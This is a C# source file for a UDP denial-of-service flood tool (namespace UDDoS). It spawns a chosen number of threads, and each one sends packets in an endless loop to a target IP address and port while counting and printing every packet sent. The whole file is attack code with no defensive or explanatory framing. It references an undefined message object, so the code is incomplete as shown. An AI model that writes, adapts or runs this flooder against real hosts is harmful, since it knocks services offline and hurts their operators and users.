using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace UDDoS
{
    class UdpDDoS
    {
        public static int count = 0;

        public static void SendPackage(string ip, int port, int threads)
        {
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    byte[] package = message.data;
                    while(true)
                    {
                        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        try
                        {
                            sock.SendTo(package, ep);
                            count++;
                            Console.WriteLine("udphv/> Pacakge sent through UDP to {0} || Count > " + count.ToString(), ip);
                        }
                        catch(SocketException)
                        {
                            Console.WriteLine("Server is down!");
                        }
                    }
                });
                ths[i].Start();
            }
        }
    }
}